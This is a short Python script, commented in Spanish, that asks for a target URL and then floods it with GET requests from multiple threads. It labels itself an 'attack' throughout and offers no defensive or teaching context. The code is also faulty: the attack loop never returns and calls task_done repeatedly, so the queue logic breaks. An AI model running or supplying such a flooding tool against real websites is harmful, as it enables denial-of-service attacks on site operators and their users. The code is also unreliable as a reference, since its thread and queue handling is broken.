import threading
import requests
import time
from queue import Queue

# Cola para manejar las solicitudes
queue = Queue()

# Función que realiza solicitudes GET al sitio web objetivo
def attack(url):
    while True:
        try:
            response = requests.get(url)
            print(f"Atacando {url} - Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error al atacar {url}: {e}")
        finally:
            queue.task_done()

# Función que llena la cola de solicitudes
def fill_queue(url, num_requests):
    for _ in range(num_requests):
        queue.put(url)

# Función principal que crea hilos para el ataque
def main():
    # Solicitamos al usuario que ingrese la URL del sitio web objetivo
    url = input("Ingresa la URL del sitio web objetivo (por ejemplo, http://ejemplo.com): ")
    
    # Verificamos si la URL es válida
    if not url.startswith("http"):
        print("La URL debe comenzar con http:// o https://")
        return
    
    # Solicitamos al usuario que ingrese el número de solicitudes
    num_requests = int(input("Ingresa el número de solicitudes: "))
    
    # Solicitamos al usuario que ingrese el número de hilos para el ataque
    num_threads = int(input("Ingresa el número de hilos para el ataque: "))
    
    # Llenamos la cola con las solicitudes
    fill_queue(url, num_requests)
    
    # Creamos y arrancamos los hilos
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        thread.daemon = True  # Permite que el programa termine incluso si los hilos siguen ejecutándose
        threads.append(thread)
        thread.start()
    
    # Esperamos a que todas las tareas encoladas se completen
    queue.join()
    print("Ataque finalizado.")

# Función que procesa las solicitudes en la cola
def worker():
    while True:
        url = queue.get()
        attack(url)
        queue.task_done()

if __name__ == "__main__":
    main()